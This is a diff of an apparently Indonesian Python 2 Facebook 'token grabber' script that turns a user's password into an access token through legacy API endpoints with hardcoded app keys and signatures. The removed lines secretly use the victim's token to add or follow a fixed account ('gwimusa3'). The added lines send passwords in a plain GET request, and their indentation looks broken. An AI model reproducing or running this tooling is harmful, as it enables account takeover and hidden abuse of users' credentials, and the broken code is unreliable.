@@ -40,48 +40,29 @@ def login():
         main()
     except (KeyError, IOError):
         print h+" LOGIN FACEBOOK BRO.."
-        id = raw_input(p+" Username :")
-        passw = raw_input(p+" Password :")
-        try:
-            br.open('https://m.facebook.com')
-        except mechanize.URLError:
-            print m+" [ Tidak ada koneksi.. ]"
-        br._factory.is_html = True
-        br.select_form(nr=0)
-        br.form['email'] = id
-        br.form['pass'] = passw
-        br.submit()
-        url = br.geturl()
-        if 'save-device' in url:
-            try:
-                dev = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + passw + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': passw, 'return_ssl_resources': '0', 'v': '1.0'}
-                iv = hashlib.new("md5")
-                iv.update(dev)
-                van = iv.hexdigest()
-                data.update({'dev': van})
-                url = 'https://api.facebook.com/restserver.php'
-                req = requests.get(url, params=data)
-                jsl = json.loads(req.text)
-                iq = open('token.txt', 'w')
-                iq.write(jsl['access_token'])
-                iq.close()
-                print h+" Berhasil Login...."
-                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+jsl['access_token'])
-                
-                akun()
-                
-            except KeyError:
-                print m+" [ Terjadi Kesalahan.. ]"
-        if 'checkpoint' in url:
-            print m+" Akun Kena Cekpoint.."
-            os.system("rm -f token.txt")
-            login()
+        id = raw_input(p+'[?] \033[96mUsername FB lu Tod\033[97m: ')
+        passwordlu = raw_input(p+'[?] \033[95mPassword FB lu Tod\033[97m: ')
+        iqbalz_noobs = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+id+'&locale=en_US&password='+passwordlu+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 
+        lop = iqbalz_noobs.content
+        bacot = json.loads(lop)
+        if "session_key" in lop:
+                print " "
+                
+		        print h+"[+] Token Fb Anda adalah \033[91m=>\033[92m " + bacot["access_token"]
+		        open(id+"token.txt", 'a').write(bacot["access_token"])
+		        print " "
+		        print h+"        T O K E N  S U C C E S S "
+                print h+"                  T O D"
+                print p+" "
+                
+                print pu+" "
         else:
-            print m+" Gagal Login..."
-            os.system("rm -f token.txt")
-            login()
+	         	print m+"Login Gagal Cuk...."
+		        print " "
+                print m+" "
+                os.system("rm -f token.txt")
+                login()
             
 def akun():
     try:
